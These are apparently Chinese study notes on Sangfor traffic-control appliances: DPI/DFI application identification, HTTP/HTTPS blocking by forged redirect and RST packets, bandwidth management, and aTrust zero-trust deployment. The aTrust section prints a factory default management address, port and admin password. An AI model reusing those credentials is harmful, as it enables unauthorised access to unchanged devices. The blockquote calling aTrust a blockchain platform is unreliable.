title="4.2.11应用特征识别技术"></a>4.2.11应用特征识别技术</h4><ol><li>需求背景</li></ol><p>需求背景(一):</p><p>​全天不允许使用QQ等聊天工具</p><p>需求背景(二)</p><p>​全天只允许特定QQ账号上网，不允许其他QQ账号上网</p><p><strong>实现需求一功能</strong></p><p>​传统行为检测原理:传统的网络设备根据数据包的五元组(源IP、目的IP，源端口，目的端口，协议)这些特征等来识别应用并进行丢弃、转发、接收、处理等行为。</p><p><img src="https://pic.imgdb.cn/item/6743ea8488c538a9b5bb8641.png"></p><p>​通过识别协议为UDP，端口为8000，从而识别出是QQ聊天的应用将该类数据包全部丢弃，</p><p><strong>实现需求二功能</strong></p><p>​从数据包中发现，QQ用户的字段在应用层OICQ协议的Data字段。该需求需要识别特定的QQ用户，而传统的行为检测只能对链路层、网络层、传输层进行数据处理，不能对应用层进行操作。</p><p><img src="https://pic.imgdb.cn/item/6743eb7b88c538a9b5bb8684.png"></p><p><img src="https://pic.imgdb.cn/item/6743ebb388c538a9b5bb86a4.png"></p><h5 id="深度行为检测技术"><a href="#深度行为检测技术" class="headerlink" title="深度行为检测技术"></a>深度行为检测技术</h5><p>产生背景：传统技术无法识别精细的数据包应用和行为，无法识别经过伪装的数据包，无法满足现在的安全需求和可视需求。</p><p>深度行为检测技术分为<strong>深度包检测技术</strong>（DPI）和<strong>深度流检测技术</strong>（DFI）</p><p>优点：</p><p>（1）可视化全网<br>（2）流量精细化管理<br>（3）减少或延迟带宽投入，降低网络运营成本<br>（4）及时发现和抑制异常流量<br>（5）透视全网服务质量，保障关键业务质量<br>（6）丰富的 QoS 提供能力</p><h6 id="深度包检测技术（DPI）"><a href="#深度包检测技术（DPI）" class="headerlink" title="深度包检测技术（DPI）"></a><strong>深度包检测技术</strong>（DPI）</h6><p>​深度包检测不仅检测源地址、目的地址、源端口、目的端口以及协议类型，还增加了<strong>应用层分析</strong>，另外识别各种应用及其内容。</p><p>技术分类：</p><ol><li><u>基于“特征字”的检测技术</u></li></ol><p>客户需求：在客户局域网中只允许电脑上网，不允许手机上网</p><p>需求分析：该需求需要能够识别哪些上网数据是手机端发出的，哪些是PC端发出的。通过数据包分析，发现手机和电脑在同时上网的时候（同时使用HTTP协议）会在HTTP协议的User-Agent字段区分出手机数据和PC数据。</p><p><img src="https://pic.imgdb.cn/item/6745230c88c538a9b5bbddcb.png"></p><p>​不同的应用通常依赖于不同的协议，而<u>不同的协议都有其特殊的特征</u>，这些特征可能是特定的端口、特定的字符串或者特定的 Bit 序列。<br>​基于“特征字”的识别技术通过对业务流中特定数据报文中的特征信息的检测以确定业务流承载的应用和内容，<br>​通过对应用特征信息的升级(例如http数据包中的User-Agent的位置)，基于特征的识别技术可以很方便的进行功能扩展，实现对新协议的检测。</p><ol start="2"><li><u>基于应用网关的检测技术</u>（ALG）</li></ol><ul><li>某些应用的控制流和数据流是分离的，数据流没有任何特征。这种情况下，我们就需要采用应用层网关识别技术。</li><li>应用层网关需要先识别出控制流，根据对应的协议，对控制流进行解析，从协议内容中识别出相应的业务流。</li></ul><p>客户需求：禁用VoIP视频。</p><p>需求分析：VoIP视频[^7]协议是先使用控制信令来协商数据的传输，之后进行数据流的传输。</p><p>VoIP视频数据交换过程抓包如下：</p><p><img src="https://pic.imgdb.cn/item/674524b788c538a9b5bbe260.png"></p><p>​VoIP视频协议的数据流可以看到是基于UDP的，跟踪数据流，发现该<strong>数据没有任何特征</strong>，但是VOIP在进行数据传输前是有<strong>控制信令</strong>来协商数据的传输。</p><p><img src="https://pic.imgdb.cn/item/674525fa88c538a9b5bbe4ef.png"></p><p><img src="https://pic.imgdb.cn/item/6745262588c538a9b5bbe54e.png"></p><p>存在IP地址等信息</p><ol start="3"><li><u>基于行为模式的检测技术</u></li></ol><ul><li>基于对终端已经实施的行为的分析，判断出用户正在进行的动作或者即将实施的动作</li><li>行为模式识别技术通常用于无法根据协议判断的业务的识别。</li></ul><p>例子：垃圾邮件行为模式识别</p><p>SPAM(垃圾邮件)业务流和普通的Email业务流从Email的内容上看是完全一致的，只有通过对用户行为的分析，才能够准确的识别出 SPAM 业务</p><h6 id="深度流检测技术（DFI）"><a href="#深度流检测技术（DFI）" class="headerlink" title="深度流检测技术（DFI）"></a>深度流检测技术（DFI）</h6><p>​DFI采用的是一种基于<strong>流量行为</strong>的应用识别技术，即不同的应用类型体现在<strong>会话连接或数据流上的状态</strong>等各有不同。基于流的行为特征，通过与已建立的应用数据流的数据模型对比，判断流的应用类型或业务</p><p>如下图，不同流有不同的特征，包括平均包长、下载时长等</p><p><img src="https://pic.imgdb.cn/item/6745277c88c538a9b5bbe7fc.png"></p><p>DFI技术正是基于这一系列流量的行为特征，建立流量特征模型，通过分析会话连接<u>流的包长、连接速率、传输字节量、包与包之间的间隔</u>等信息来与流量模型对比，从而实现鉴别应用类型</p><h6 id="深度包检测-DPI-VS-深度流检测-DFI"><a href="#深度包检测-DPI-VS-深度流检测-DFI" class="headerlink" title="深度包检测(DPI) VS 深度流检测(DFI)"></a>深度包检测(DPI) VS 深度流检测(DFI)</h6><ul><li>DFI仅对<strong>流量行为</strong>分析，因此只能对应用类型进行笼统分类，如对满足P2P流量模型的应用统一识别为P2P流量，对符合网络语音流量模型的类型统一归类为VOIP流量，但是无法判断该流量是否采用H.323或其他协议。</li><li>如果数据包是<u>经过加密传输的，则采用DPI方式的流控技术则不能识别其具体应用</u>，而DFI方式的流控技术则不受影响，因为应用流的状态行为特征不会因加密而根本改变。</li></ul><h4 id="4-2-12-HTTP与自定义识别控制技术"><a href="#4-2-12-HTTP与自定义识别控制技术" class="headerlink" title="4.2.12 HTTP与自定义识别控制技术"></a>4.2.12 HTTP与自定义识别控制技术</h4><h5 id="HTTP识别控制"><a href="#HTTP识别控制" class="headerlink" title="HTTP识别控制"></a>HTTP识别控制</h5><ol><li>需求背景</li></ol><p>IT部上班时间不允许访问视频网站</p><ol start="2"><li>HTTP识别工作原理</li></ol><p><img src="https://pic.imgdb.cn/item/67452a5288c538a9b5bbf098.png"></p><p>如果我们对该url做封堵，终端设备在发出get请求后(即完成HTTP识别)**<u>，设备会伪装成网站服务器向终端设备发一个状态码302的数据包</u>**，源ip是网站服务器的ip地址(实际是我们设备发送的，我们设备发送的标识是ip.id为0x5826)，数据包中的内容是告知终端设备访问网站服务器的拒绝界面。</p><p><img src="https://pic.imgdb.cn/item/67452b1088c538a9b5bbf382.png"></p><ol start="3"><li>思考总结</li></ol><p><img src="https://pic.imgdb.cn/item/67452bb188c538a9b5bbf600.png"></p><h5 id="HTTPS识别控制"><a href="#HTTPS识别控制" class="headerlink" title="HTTPS识别控制"></a>HTTPS识别控制</h5><ol><li>需求背景</li></ol><p>公共上网区的用户禁止访问百度</p><h6 id="HTTPS协议"><a href="#HTTPS协议" class="headerlink" title="HTTPS协议"></a>HTTPS协议</h6><ul><li>全称Hypertext Transfer Protocol over Secure Socket Layer，是HTTP的安全版，HTTPS默认使用TCP端口443。HTTPS中S,实际上是SSL(Secure Sockets Layer)协议</li><li>SSL是Netscape公司发明的一种用于WEB的安全传输协议。随着时间的推移由于Netscape失去了市场份额，它将SSL的维护工作移交给因特网工程任务组(IETF)。第一个后Netscape版本被重新命名为安全传输层协议(TLS)，TLS(Transport Layer Security :RFC 2246)是基于SSL上研发的，但是与SSLv3.0有细微的差别。因此，SSL协议有时也称为TLS协议。目前常用的是TLSv1.2的协议。</li></ul><ol><li>HTTPS原理</li></ol><p><img src="https://pic.imgdb.cn/item/67452cf388c538a9b5bbfac1.png"></p><ol start="2"><li>HTTPS识别工作原理</li></ol><p>​HTTPS网站识别，终端设备通过DNS解析域名后，跟网站服务器三次握手完成，终端开始发<strong>Client hello</strong>报文(SSL握手的第一阶段)，在此报文中的server name 字段包含所访问的域名，上网行为管理提取Server Name字段来识别https的网站。如下图所示：在终端设备访问<a href="https://www.baidu.com抓取到的数据包./">https://www.baidu.com抓取到的数据包。</a></p><p><img src="https://pic.imgdb.cn/item/67452e3388c538a9b5bbfe8b.png"></p><ol start="3"><li>HTTPS控制工作原理</li></ol><p>​对HTTPS网站封堵，终端设备在发送Cient helo报文后，我们识别到该网站，然后同http封堵一样，伪装网站服务器<u><strong>给终端设备发送RST包</strong></u>(ip.id也是0x5826)，断开终端设备与网站服务器之间的连接</p><ul><li>与HTTP封堵的区别：HTTPS整个过程都是加密的，在没有做SSL中间人劫持的时候是无法劫持和伪造具体数据包的，从而无法实现重定向到拒绝界面。</li></ul><p><img src="https://pic.imgdb.cn/item/67452edd88c538a9b5bc009d.png"></p><ol start="4"><li>效果展示</li></ol><p><img src="https://pic.imgdb.cn/item/67452f9888c538a9b5bc02e1.png"></p><p><u>思考：有没有办法重定向提示信息让用户知道呢？</u></p><p><strong>Client Hello方案</strong></p><p>如果只是做重定向，那只要AC能跟PC完成SSL握手就可以了，没必要像中间人代理这样两边维护请求，所以在SSL中间人的方案下，数据流简化如下:</p><p>PC发起的TCP三次握手，AC不做控制，在PC的Client Hello到达AC的时候，如果满足需要重定向的条件，则AC伪装为服务器跟PC完成SSL三次握手，等待真正的HTTPS请求过来的时候，AC再回重定向报文，完成重定向的整个过程。过程其实跟中间人代理类似，只是没有维护两边的连接。</p><p><img src="https://pic.imgdb.cn/item/674530d3d0e0a243d4d0c00a.png"></p><p>思考总结：</p><ul><li><p>HTTPS网站不能正常封堵，应该如何排查?</p><ul><li>URL库是否更新到最新版本</li><li>该https网站是否在应用识别库或URL规则库中</li><li>策略是否配置正确</li><li>策略的适用用户是否在线</li><li>该用户是否在全局排除地址中</li><li>是否开启了直通</li><li>抓包分析ServerName是否正确，是否对应该HTTPS网站</li></ul></li><li><p>HTTPS网站和HTTP网站封堵的相同点和不同点?</p><ul><li>相同点<ul><li>封堵对象的获取：都是通过获取<strong>服务器的标识</strong>进行封堵HTTP和HTTPS网站</li><li>封堵行为：都是发送<strong>RST包</strong>来断开PC和服务器的TCP连接</li></ul></li><li>不同点<ul><li>封堵对象的获取：针对HTTP是获取三次握手后的<strong>GET请求包中的HOST字段</strong>来识别服务器；针对HTTPS是在<strong>四次握手的第一阶段</strong>，获取客户机发送Client Hello包中的Servername字段来识别服务器</li><li>封堵行为：针对HTTP是先发送重定向包，再发送RST；针对HTTPS是直接发送RST结束TCP连接不发重定向包。开启SSL中间人代理/Client Hello方案也可以重定向。</li></ul></li></ul></li></ul><h5 id="自定义识别控制"><a href="#自定义识别控制" class="headerlink" title="自定义识别控制"></a>自定义识别控制</h5><ol><li>自定义应用方法</li></ol><p>​全网行为管理已经内置规则库已经覆盖常见的应用和网站，并以半个月为周期的持续更新，但难免有部分不常见的应用和网站没有更新。在这种环境下面，只要我们提供应用的特征或者url就可以通过自定义进行识别和控制。</p><ol start="2"><li>自定义应用思路</li></ol><p><img src="https://pic.imgdb.cn/item/674532dbd0e0a243d4d0c798.png"></p><ol start="3"><li>URL自定义思路</li></ol><p><img src="https://pic.imgdb.cn/item/6745332bd0e0a243d4d0c7ae.png"></p><ol start="4"><li>对象自定义总结</li></ol><ul><li>自定义准入规则：可以定义运行了某个进程才允许(或不允许)上网</li><li>自定义应用(封堵或审计精准的应用)</li><li>自定义URL(封堵或审计精准的URL)</li><li>自定义关键字(用作关键字过滤或审计)</li><li>………………</li><li>对象自定义的作用：对于精准的应用等进行精准的管控，保证在99.99%的日常应用能被sangfor内置识别库识别的基础上，对0.01%的应用进行精准的管控</li></ul><ol start="5"><li>访问控制策略排查思路</li></ol><p>（1）检查设备部署,如是旁路模式部署,设备本身只能对一些TCP的应用做控制。<br>（2）【全网监控】-【入网用户管理】查看策略对应的用户是否在线。<br>（3）检查规则库“应用识别”、“URL库”、“审计规则库”是否为最新。<br>（4）检查上网权限策略是否与用户关联，检查用户是否关联了多条上网权限策略，注意策略的叠加顺序(自上而下优先级递减)。</p><p>（5）检查【系统诊断】-【上网故障排除】是否开启直通；【系统配置】-【全局排除地址】是否有排除内网PC的ip、目标域名、目标IP等。<br>（6）检查是否有自定义应用，禁用或删除自定义的应用看策略是否正常。<br>（7）给用户关联一条【互联网审计策略】,开启所有应用的审计,进入【内置数据中心】,检查数据中心识别到的应用和实际使用的应用是否对应。如不对应那回滚下应用识别规则库再重新更新规则库<br>（8）如数据中心没有识别内网PC任何的应用，此时注意检查客户是否有其它的上网线路，抓包分析用户流量是否经过AC</p><h4 id="4-2-13-流量管理概述"><a href="#4-2-13-流量管理概述" class="headerlink" title="4.2.13 流量管理概述"></a>4.2.13 流量管理概述</h4><h5 id="流量管理背景"><a href="#流量管理背景" class="headerlink" title="流量管理背景"></a>流量管理背景</h5><ul><li>带宽资源被非关键应用大量占用</li><li>传统的缓存丢包式的流控无法控制P2P下行流量</li><li>空闲时带宽利用率低</li><li>一刀切的流量控制手段，影响员工使用体验</li></ul><p><strong>P2P流量占用大量带宽</strong></p><p>​在众多的网络应用中，尤以P2P应用的带宽侵蚀性最为强烈。据调查统计，P2P应用对带宽占用比大致是40%~60%，在极端情况下占用比会达到80%~90%。同时，再加上其他与工作无关的应用占用了带宽资源。核心业务应用得不到充分的带宽资源，员工在日常工作中反应网络慢，严重影响工作效率。因此，企业需要完善的上网流量管理方案，对带宽资源进行合理的分配。</p><h5 id="流量管理技术"><a href="#流量管理技术" class="headerlink" title="流量管理技术"></a>流量管理技术</h5><ol><li>传统流量管理技术的缺陷</li></ol><ul><li><p>流量控制建立在流量识别的基础上，所以流量识别相当重要</p></li><li><p>传统的流控方式是基于网络协议的L4层及以下的内容(非有效负载内容)进行分析，通常可以基于固定的数据封装格式提取数据特征</p></li><li><p>举例:使用QoS技术实现基于源地址、目的地址、源端口、目的端口以及协议类型等“五元组”的流量控制。</p></li><li><p>通过“五元组”定义各种流量，针对不同流量实施不同的排队机制和拥塞机制以实现控制流量的目的。</p></li><li><p>但这种传统的IP数据包流量识别和QoS技术，仅根据数据包头中的“五元组”信息进行分析，却无法识别出流量中所涉及的应用，因此无法对应用进行精细的流控。</p></li><li><p>现在主流的流控已经能实现对流量的精准精细流控</p></li><li><p>传统流控是伪流控</p></li><li><p>传统流控：基于缓存丢包方式，UDP协议自身没有速率调整机制，且P2P传输模式具有特殊性，外网线路依然被大量的P2P数据报文所占用，导致带宽浪费。</p></li></ul><p><img src="https://pic.imgdb.cn/item/6746b33dd0e0a243d4d1db89.png"></p><ol start="2"><li>主流的流量管控技术</li></ol><p>（1）流量检测方法<br>（2）应用控制技术<br>（3）应用检测技术<br>（4）识别控制组网模式</p><h6 id="1-流量检测方法"><a href="#1-流量检测方法" class="headerlink" title="1 流量检测方法"></a>1 流量检测方法</h6><p><img src="https://pic.imgdb.cn/item/6746b3e2d0e0a243d4d1dba5.png"></p><h6 id="2-应用控制技术"><a href="#2-应用控制技术" class="headerlink" title="2 应用控制技术"></a>2 应用控制技术</h6><ul><li>流量整形技术<br>  根据数据流识别的结果，对数据流量<u>采用阻塞、随机丢包、或者提供QoS保证</u>等方式，对符合策略控制条件的数据流进行流量管理和资源调度，达到流量控制的目的。</li></ul><p>​举例：TCP整形技术—滑动窗口允许根据自己的接受速率动态调整窗口大小来调整发送方的数据传输速率</p><ul><li>连接干扰（TCP）/信令干扰（UDP）<ul><li>连接干扰—根据数据流识别的结果，针对TCP流量，复制数据流的IP五元组信息，并交换源/目的IP、端口，伪造成为数据流连接的对端，发送标准的TCP Reset/FIN数据包，中断该数据流连接，或者引发TCP重传，达到流量控制的目的。</li><li>信令干扰—针对UDP流量，由于UDP为无状态协议，因此无法从4层对数据流进行干扰，只能通过7层的协议信令进行干扰，达到流量控制的目的。</li></ul></li></ul><img src="https://pic.imgdb.cn/item/6746b7a7d0e0a243d4d1dcbf.png" style="zoom:67%;"><h6 id="3-应用检测技术"><a href="#3-应用检测技术" class="headerlink" title="3 应用检测技术"></a>3 应用检测技术</h6><ul><li>常用端口检测<br>  端口检测法是依赖于端口来识别流量，在应用较少的互联网初期作用效果较好<br>  随着互联网发展的多样化，应用的常用端口越来越不明显，因此，该方法识别能力非常有限。</li><li>深度流检测(DFI)<br>  深度流检测方法主要采用基于<strong>流量行为</strong>的应用识别技术，即不同的应用类型体现在会话连接或数据流上的状态不同。<br>  主要识别指标包括：<u>数据包的大小、速率、延时、持续时间、发送频率、上下行流量的比例关系以及IP地址的连接方式</u>等。</li><li>深度包检测(DPI)<br>  深度包检测不仅<u>检测源地址、目的地址、源端口、目的端口以及协议类型</u>，还增加了**<u>应用层</u>**分析，另外识别各种应用以及内容，包括<u>关键字检测、应用网关检测、行为模式检测</u></li></ul><h6 id="4-识别控制组网模式"><a href="#4-识别控制组网模式" class="headerlink" title="4 识别控制组网模式"></a>4 识别控制组网模式</h6><ul><li><p>直路串联流控模式<br>  串联在网络中，控制方式比较直接，可以灵活的对不同流量使用不同策略<br>  串联使得控制设备成为被控网络的一部分，控制设备可能会影响整个被控链路</p></li><li><p>旁路干扰流控模式<br>  （1）TCP截断，通过伪造并发送TCP RST报文来截断TCP连接<br>  （2）TCP降速，通过伪造并发送特殊sequence报文来减小TCP的滑动窗口值。<br>  （3）UDP截断，通过伪造并发送P2P应用层特殊控制命令方式来截断UDP连接<br>  （4）UDP降速，通过伪造并发送P2P应用层特殊控制命令方式来降低UDP连接的传送速率。<br>  优势：对链路影响较小，可扩展性(扩展其他功能)较强</p><p>  劣势：目前只能对应地使用连接干扰、信令干扰技术进行数据流控制，控制能力受到较大影响</p></li></ul><p><strong>网络流量控制系统</strong></p><p>当前广泛部署的网络流量控制系统主要由四个部分：<strong>流量分类</strong>，<strong>队列管理</strong>，<strong>分组调度</strong>，<strong>流量整形</strong>。</p><ul><li><p>流量分类：按照不同的优先级或控制策略，将数据包注入到不同队列。当前的流量分类技术主要分为基于端口、会话、内容的识别方式。</p></li><li><p>队列管理：指对网络传输节点中队列缓冲资源的管理和分配，即缓冲管理。通过控制队列的平均深度来避免拥塞发生。</p></li><li><p>分组调度：分类器根据分组的上下文和粒度确认它所在的队列，分组进入相应队列排队等候，直至调度器将其选择发送。可以控制不同类型的分组对链路带宽的利用使不同的数据流得到不同等级的服务。</p></li><li><p>流量整形：使经过网络瓶颈的数据包平缓的注入主干网，减少数据包在边缘网关排队等待的时间，从而减少边缘网关缓存的大小和数据包丢失率。流量整形主要采用两种基本方法:漏桶算法和今牌桶算法</p></li></ul><h5 id="流量控制解决方案"><a href="#流量控制解决方案" class="headerlink" title="流量控制解决方案"></a>流量控制解决方案</h5><p><img src="https://pic.imgdb.cn/item/6746d160d0e0a243d4d1e7a4.png"></p><ol><li>SANGFOR流控原理</li></ol><ul><li>缓存流控<br>  以前的流控的效果是通过直接丢包来实现的，导致了丢包率比较高，SANGFOR使用缓存的方式，可以有效的解决丢包的问题。</li><li>队列调度(HTB分层令牌桶)<br>  可以使每个连接的数据包得到更为公平的调度。避免因为某个连接速率过高导致其他连接得不到带宽的问题。使保证带宽更准确。</li><li>单用户流量的公平调度(UCFQ:User &amp; Conn Fair Qdisc)<br>  对当前有流量的用户进行公平调度，而不是根据在线用户进行带宽分配，因为在线的用户不一定有流量。对用户的流量进行公平调度，避免某个用户的流量很大，导致其他用户只能使用很少的带宽。保证同一通道的用户流量可以平均分配</li></ul><ol start="2"><li>P2P智能流控技术</li></ol><p><img src="https://pic.imgdb.cn/item/6746d248d0e0a243d4d1e7fe.png"></p><ol start="3"><li>动态流控技术</li></ol><ul><li>设定阈值(%)来区分空闲和繁忙状态，当整体带宽利用率低于值时通道的最大带宽</li><li>限制将上浮，直到整体利用率超过了闽值，才回收上浮的部分，实现带宽利用率最大化</li></ul><p><img src="https://pic.imgdb.cn/item/6746d2ded0e0a243d4d1e847.png"></p><p><img src="https://pic.imgdb.cn/item/6746d34ed0e0a243d4d1e88a.png"></p><ol start="4"><li>流控黑名单</li></ol><p><img src="https://pic.imgdb.cn/item/6746d37ad0e0a243d4d1e89d.png"></p><ol start="5"><li>流控通道匹配过程</li></ol><ul><li>同级通道从上往下匹配</li><li>匹配到父通道后如果有下级子通道，则继续往下级匹配直到匹配到最后一级</li><li>如果无法匹配到任何自定义的通道，则匹配到所在级别的默认通道</li></ul><ol start="6"><li>流控通道优先级</li></ol><ul><li>保证通道和限制通道都可以设置优先级</li><li>优先级别相同时，如果都需要借用带宽则按照保证带宽的比例借用</li><li>优先级别不同，都需要借用带宽时，带宽优先给优先级高的通道使用，剩下的带宽才给低级别的通道借用。</li></ul><h4 id="4-2-14-流量管理应用场景"><a href="#4-2-14-流量管理应用场景" class="headerlink" title="4.2.14 流量管理应用场景"></a>4.2.14 流量管理应用场景</h4><h4 id="4-2-15-DNS与链路流量管理"><a href="#4-2-15-DNS与链路流量管理" class="headerlink" title="4.2.15 DNS与链路流量管理"></a>4.2.15 DNS与链路流量管理</h4><h4 id="4-2-16-行为审计概述"><a href="#4-2-16-行为审计概述" class="headerlink" title="4.2.16 行为审计概述"></a>4.2.16 行为审计概述</h4><h4 id="4-2-17-SSL内容解密技术"><a href="#4-2-17-SSL内容解密技术" class="headerlink" title="4.2.17 SSL内容解密技术"></a>4.2.17 SSL内容解密技术</h4><h4 id="4-2-18-客户端与业务审计技术"><a href="#4-2-18-客户端与业务审计技术" class="headerlink" title="4.2.18 客户端与业务审计技术"></a>4.2.18 客户端与业务审计技术</h4><h4 id="4-2-19-数据价值解决方案"><a href="#4-2-19-数据价值解决方案" class="headerlink" title="4.2.19 数据价值解决方案"></a>4.2.19 数据价值解决方案</h4><h4 id="4-2-20-管理员账号功能"><a href="#4-2-20-管理员账号功能" class="headerlink" title="4.2.20 管理员账号功能"></a>4.2.20 管理员账号功能</h4><h4 id="4-2-21-结合AD域单点登录功能（脚本方式）"><a href="#4-2-21-结合AD域单点登录功能（脚本方式）" class="headerlink" title="4.2.21 结合AD域单点登录功能（脚本方式）"></a>4.2.21 结合AD域单点登录功能（脚本方式）</h4><h4 id="4-2-22-结合AD域单点登录功能"><a href="#4-2-22-结合AD域单点登录功能" class="headerlink" title="4.2.22 结合AD域单点登录功能"></a>4.2.22 结合AD域单点登录功能</h4><h3 id="第三部分-零信任基础原理与运维"><a href="#第三部分-零信任基础原理与运维" class="headerlink" title="第三部分 零信任基础原理与运维"></a>第三部分 零信任基础原理与运维</h3><blockquote><p>aTrust是一款基于区块链技术的信任管理平台，主要用于数字身份管理和数据安全。它通过去中心化的方式，提供安全、透明和可追溯的身份验证和数据共享服务。</p></blockquote><h4 id="4-3-1-aTrust设备部署实施上架"><a href="#4-3-1-aTrust设备部署实施上架" class="headerlink" title="4.3.1 aTrust设备部署实施上架"></a>4.3.1 aTrust设备部署实施上架</h4><ol><li>硬件环境</li></ol><ul><li>零信任aTrust分为“<strong>分离式部署</strong>”和“<strong>综合网关部署</strong>”两种形式。</li><li>代理网关设备、控制中心设备、综合网关设备外观基本相同(网口数有差异)，主要是设备上的型号差异。</li><li>控制中心型号以C结尾，如aTrust-1000-B1080C;</li><li>代理网关的型号以G结尾，如aTrust-1000-B1060G;</li><li>综合网关型号以M结尾，如aTrust-1000-V1050M。</li></ul><p>​aTrust设备，控制中心和安全代理网关的默认的出厂IP均为MANAGE(ETHO):10.254.254.254/24。如果电脑连接的是aTrust设备控制中心或安全代理网关的MANAGE(ETH0)口，需要先在电脑上配置一个10.254.254.0/24网段的地址，打开浏览器输入<a href="https://10.254.254.254:**4433">https://10.254.254.254:**4433</a>** 登录设备网关控制台。控制中心或安全代理网关控制台管理端口是4433，默认用户名admin密码SangforSDP@1220</p><ol start="2"><li>软件环境</li></ol><ul><li>支持虚拟化部署，支持平台有:<ol><li>深信服超融合平台(HCIV5.8.6及以上)</li><li>VMware5.0及以上，使用KVM虚拟化技术，支持qcow2格式导入的虚拟化环境</li><li>各种常见公有云平台，如阿里云、腾讯云、华为云、</li></ol></li><li>服务器配置参数要求</li></ul><p><img src="https://pic.imgdb.cn/item/66dc703bd9c307b7e975ecd8.png"></p><ol start="3"><li><p>安装–HCI平台镜像部署</p><p> 1. </p><pre><code> ![](https://pic.imgdb.cn/item/66dc715bd9c307b7e9776ff9.png)</code></pre><p> 2. </p><pre><code> ![](https://pic.imgdb.cn/item/66dc71a8d9c307b7e977db66.png)</code></pre><p> 3. </p><pre><code> ![](https://pic.imgdb.cn/item/66dc71cfd9c307b7e97810f3.png)</code></pre><p> 4. </p><pre><code> ![](https://pic.imgdb.cn/item/66dc71eed9c307b7e978420c.png)</code></pre><ol start="5"><li><p>网络部署–后台配置临时网络</p><p> <img src="https://pic.imgdb.cn/item/66dc722cd9c307b7e9789fab.png"></p></li><li><p>网络部署–web平台配置网络</p><p> <img src="https://pic.imgdb.cn/item/66dc72e6d9c307b7e979afed.png"></p></li></ol></li></ol><p><img src="https://pic.imgdb.cn/item/66dc731cd9c307b7e979fe31.png"></p><p><img src="https://pic.imgdb.cn/item/66dc738fd9c307b7e97aa3cc.png"></p><p><img src="https://pic.imgdb.cn/item/66dc73bbd9c307b7e97ae03a.png"></p><p><img src="https://pic.imgdb.cn/item/66dc7438d9c307b7e97b9d20.png"></p><p><img src="https://pic.imgdb.cn/item/66dc745dd9c307b7e97bcfce.png"></p><ol start="4"><li>控制中心和代理网关联动</li></ol><p><img src="https://pic.imgdb.cn/item/66dc74cdd9c307b7e97c698c.png"></p><p><img src="https://pic.imgdb.cn/item/66dc74fbd9c307b7e97caaf0.png"></p><p><img src="https://pic.imgdb.cn/item/66dc7530d9c307b7e97cfdb0.png"></p><p><img src="https://pic.imgdb.cn/item/66dc7566d9c307b7e97d4aa6.png"></p><p><img src="https://pic.imgdb.cn/item/66dc7579d9c307b7e97d6788.png"></p><p><img src="https://pic.imgdb.cn/item/66dc75b3d9c307b7e97db541.png"></p><ol start="5"><li>aTrust用户访问和客户端下载</li></ol><p></p><h4 id="4-3-2-aTrust本地集群部署"><a href="#4-3-2-aTrust本地集群部署" class="headerlink" title="4.3.2 aTrust本地集群部署"></a>4.3.2 aTrust本地集群部署</h4><ol><li>本地集群部署使用背景</li></ol><p>​本地集群部署主要是为解决设备高可用问题，为客户**<u>提供设备容灾</u>和<u>扩容</u>的能力**。实现单节点设备出现故障时，集群模块能进行容灾处理，不中断业务的效果</p><p>控制中心(SDPC)集群目前主要提供两部分的能力:</p><ul><li>高可用性:集群中的一个节点失效，业务可转移给另一个节点，不中断业务。</li><li>高性能:集群采用负载均衡技术，实现接更多用户的接入，业务响应速度更快。</li></ul><p>代理网关(Proxy)集群目前主要提供两部分的能力:</p><ul><li><p>高可用性:集群中的一个节点失效，业务可转移给另一个节点，不中断业务。</p></li><li><p>高性能:集群采用负载均衡技术，实现更多的接入资源访问。</p></li><li><p>零信任aTrust，控制中心SDPC、代理网关Proxy和二合一综合网关组建主从集群时，支持集群数量为2~4台进行组建。</p></li><li><p>其中控制中心sdpc和二合一集群添加节点时，可以选择节点的角色，分为<strong>从节点</strong>和<strong>工作节点</strong>，从节点数量要<br>  求至少有一个，至多有四个;</p></li><li><p>代理网关proxy集群分为<strong>集群主从模式</strong>、<strong>双机热备式</strong>。</p></li><li><p>主从模式下的集群扩展支持1主+1从+2工作、1主+2从+1等工作模式，但不支持1主+3从，在此模式下性能难<br>  以满足。</p></li><li><p>设备版本低于 2.1.17 时，必须要拆除集群和 proxy 分别升级;当版本为 2.1.17及之后 的版本时，可以在不<br>  拆除集群和 proxy的场景下，进行设备升级。。</p></li></ul><blockquote><p>注:从节点与工作节点区别:</p><ul><li>从节点具备灾备和工作负载两种作用，在主节点出现故障后，从节点会自动切换为主节点(如有两个从节点，则随机进行切换);而工作节点仅具备工作负载作用。</li><li>从节点需要实时和主节点进行数据同步，工作节点仅在每天凌晨进行数据同步。因此从节点在设备运行时对主节点性能消耗更高。</li></ul></blockquote><ol start="2"><li>本地集群部署配置指导</li></ol><p><img src="https://pic.imgdb.cn/item/66dd1642d9c307b7e960e013.png"></p><ol start="3"><li><p>集群部署配置案例–组建代理网关集群，并与控制中心联动</p></li><li><p>注意事项</p></li></ol><ul><li>Proxy集群由于是采用的<strong>DR模式</strong>（直接转发），要求Proxy集群节点只能是在同一局域网，<u>不能跨局域网之间的节点进行组建</u></li><li>两台sdpc（控制中心）或proxy设备CPU核数(可以在console页面查看)、内存大小、网口数需均一致</li><li>软件版本、授权类型(分基础版和增强版)必须一致</li><li>硬件和虚拟化软件设备、不同虚拟化环境上的虚拟机不能组集群</li><li>主线版本一致，但一台打了定制包或补丁包的，另一台没有，不建议组集群</li><li>设备版本低于 2.1.17时，升级必须要拆除集群;当版本为 2.1.17及之后 的版本时，可以在不拆除集群的场<br>  景下，进行设备升级。</li><li>当前集群状态下，不支持配置导入，需要拆集群后再导入配置</li><li>SDPC集群会同步配置信息，Proxy集群不同步配置信息</li></ul><h4 id="4-3-3-aTrust用户管理"><a href="#4-3-3-aTrust用户管理" class="headerlink" title="4.3.3 aTrust用户管理"></a>4.3.3 aTrust用户管理</h4><p>​用户管理，用于提供用户认证登录的用户源，管理各个认证服务器的用户和组织信息。可实现用户/组织的新增、删除、编辑，实现用户、组织架构、角色的精细化授权，和策略绑定(包括认证策略和用户策略)</p><p>aTrust用户目录，主要有两种来源，分别是外部和本地<br>（1）本地</p><ul><li>本地用户目录<ul><li>本地用户目录是aTrust设备内置的数据库用户目录管理，当客户没有第三方用户服务器时，可使用本地用户目录进行管理。</li></ul></li><li>自定义本地用户目录<ul><li>客户使用的是第三方的认证服务器，但第三方认证服务器没有提供LDAP/AD或企业微信等用户源设备导入至aTrust本地。此时我们可使用自定义本地用户目录，将第三方的用户信息批量导入aTrust本地。</li></ul></li></ul><p>（2）外部</p><ul><li>微软MS ActiveDirectory、Open LDAP、Sangfor IDTrust LDAP</li><li>企业微信</li><li>钉钉</li></ul><ol><li>用户目录管理–本地用户</li></ol><p><img 